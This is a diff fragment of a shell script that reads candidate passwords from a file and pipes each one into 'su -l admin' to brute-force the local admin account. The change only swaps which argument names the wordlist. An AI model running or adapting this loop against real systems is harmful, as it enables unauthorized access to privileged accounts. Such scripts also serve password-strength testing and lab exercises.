@@ -16,7 +16,7 @@ echo "============================================="
 while IFS= read -r pass; do
     echo "Testing admin:$pass"
     echo "$pass" | su -l admin
-done < $2
+done < $1
 echo "============================================="
 echo "======== Done Admin - Random Pass ==========="
 echo "============================================="
